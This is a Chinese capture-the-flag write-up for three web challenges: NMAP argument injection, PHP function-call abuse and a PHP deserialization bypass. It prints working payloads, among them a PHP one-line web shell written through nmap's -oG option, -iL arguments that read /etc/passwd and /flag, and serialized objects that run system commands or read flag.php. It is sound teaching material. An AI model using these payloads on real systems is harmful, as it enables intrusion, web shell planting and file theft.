---
title: CTFHub 网鼎杯(一)
categories: 赛题wp
---

![](https://img-blog.csdnimg.cn/20210316223234445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
## NMAP
- 考点： nmap参数
-  -oG  #可以实现将命令和结果写到文件
-  -iL /etc/passwd 读取任意文件扫描列表
- o /tmp/1 输出扫描结果

 ![](https://img-blog.csdnimg.cn/2021031622331433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
扫描127.0.0.1

![](https://img-blog.csdnimg.cn/20210316223323563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
这里使用nmap的一个参数 ：
```
  -oG  #可以实现将命令和结果写到文件
  ```

我们可以写入一句话
```
' <?php eval($_POST[shell]);?> -oG 1.php ' (注意空格)
```

回显Hacker

短标签绕过 `php换为phtml`

所以payload：
```
  '<?=eval($_POST[shell]);?> -oG 1.phtml '
  当单引号前有空格时，直接访问1.phtml，当没有空格时，访问1.phtml\\
```
蚁剑链接即可

![](https://img-blog.csdnimg.cn/2021031622362454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210316223636740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现当不加空格的时候文件名后为什么会出现`\\` 

见法二

![](https://img-blog.csdnimg.cn/20210316223743447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
法二：
```
 -iL /etc/passwd 读取任意文件扫描列表
 -o /tmp/1 输出扫描结果
```
这里源码使用了`escapeshellarg` 和 `escapeshellcmd`

[上述两函数的漏洞](https://paper.seebug.org/164/)

当我们输入payload：
```
 127.0.0.1’ -iL /etc/passwd -o 1
```

经过函数处理：

![](https://img-blog.csdnimg.cn/20210316223948535.png#pic_center)
访问`1’` 文件即可

还有以下不同：

```
输入：  ' 127.0.0.1 -iL /flag -o 7.txt '  直接访问 7.txt
回显：  f571d -iL /flag -o 7.txt \ 127.0.0.1 \\

输入：  127.0.0.1' -iL /flag -o 8.txt  访问 8.txt'
回显：  f571d -iL /flag -o 8.txt' 127.0.0.1\
```

---
## PHPweb
- 考点：反序列化

![](https://img-blog.csdnimg.cn/20210316224631516.png#pic_center)
抓包后发现  在`func`处应该是调用函数，p为参数

使用 `file_get_contents`   &p=index.php

读取index.php 的源码：


```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch",
      "escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",
      "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce",
      "array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents"
    );
    function gettime($func, $p) {
      $result = call_user_func($func, $p);
      $a= gettype($result);
      if ($a == "string") {
        return $result;
      } else {
        return "";
      }
    }
    class Test {
      var $p = "Y-m-d h:i:s a";
      var $func = "date";
      function __destruct() {
        if ($this->func != "") {
          echo gettime($this->func, $this->p);
        }
      }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];
    if ($func != null) {
      $func = strtolower($func);
      if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
      }else {
        die("Hacker...");
      }
    }
  ?>
```

可见并未ban掉unserialize函数
反序列化：

```php
<?php
class Test {
    var $p = "ls /";   //   ”cat /flag_3969089”
    var $func = "system";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$a = new Test();
echo serialize($a);
?>
```
再调用unserialize

![](https://img-blog.csdnimg.cn/20210316225628795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## AreUSerialz
- 考点：反序列化中出现不可见字符的处理

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {   //只用读取函数就行了
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")  //等于字符2，我们令op=2(int类型)即可绕过此处
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}

```
简单反序列化：

```php
<?php
	class FileHandler {
		protected $op = 2;
		protected $filename = "flag.php";
		protected $content = "";
	}
	$a = new FileHandler();
	echo(serialize($a));
?>
```

![](https://img-blog.csdnimg.cn/20210316225749544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

然而出现不可见字符 解决如以下两个方法：

一、\00
PHP序列化的时候`private`和`protected`变量会`引入不可见字符\x00`， %00*%00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错，所以序列化也要加上这些东西。

而%00转化为ascii码会被is_valid()过滤掉。绕过的方法是`在序列化内容中用大写S表示字符串且空格处添加\00`，这时这个字符串就支持将后面的字符串用16进制表示。

最终构造的payload：
```
O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:0:"";}
```

二、public

php>7.1版本对类属性的检测不严格来绕过，`将序列化里的portected属性换成public属性，就不会有/00`


![](https://img-blog.csdnimg.cn/20210316230221272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

